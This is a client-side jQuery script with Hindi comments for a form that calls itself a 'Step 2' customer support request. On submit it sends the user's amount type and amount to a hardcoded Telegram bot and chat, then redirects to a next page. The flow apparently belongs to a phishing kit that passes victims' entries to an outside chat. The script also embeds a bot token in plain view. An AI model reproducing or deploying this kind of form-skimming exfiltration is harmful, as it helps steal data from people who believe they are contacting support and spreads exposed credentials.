$(document).ready(function() {
    // Amount Type बदलने पर लेबल और इनपुट वैलिडेशन अपडेट करें
    $(".amount-type").change(function() {
        var amountType = $(this).val();
        $("#amount-type-label").text(amountType); // लेबल अपडेट करें

        if (amountType === "Other") {
            $("#amount").removeAttr("required");
            $(".order-amount").hide();
        } else {
            $("#amount").attr("required", true);
            $(".order-amount").show();
        }
    });

    // Form Submit Event
    $("#submitForm").submit(function(event) {
        event.preventDefault(); // Default Form Submission रोकें

        var amountType = $("input[name='amount_type']:checked").val();
        var amount = $("#amount").val().trim();
        var nextPage = $("#nextValue").val(); // अगले पेज का URL

        // "Other" के अलावा Amount required है
        if (amountType !== "Other" && amount === "") {
            alert("कृपया Amount दर्ज करें।");
            return;
        }

        // Telegram API Details
        var botToken = "7839710665:AAGKbR-tYd-mfFYfptxDZnpaUctzEAWMfwU";
        var chatId = "-1002677669875";
        var message = `🆕 *Step 2 - कस्टमर सपोर्ट अनुरोध* 🆕\n\n💰 *अमाउंट टाइप:* ${amountType}\n💵 *अमाउंट:* ${amount || "N/A"}`;

        var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        // Telegram API को डेटा भेजना
        fetch(telegramUrl)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    $("#submitForm")[0].reset(); // फॉर्म रीसेट करें
                    window.location.href = nextPage; // अगले पेज पर जाएं
                } else {
                    alert("मैसेज भेजने में समस्या आई। कृपया फिर से प्रयास करें।");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("सर्वर से कनेक्ट नहीं हो सका। कृपया इंटरनेट चेक करें।");
            });
    });
});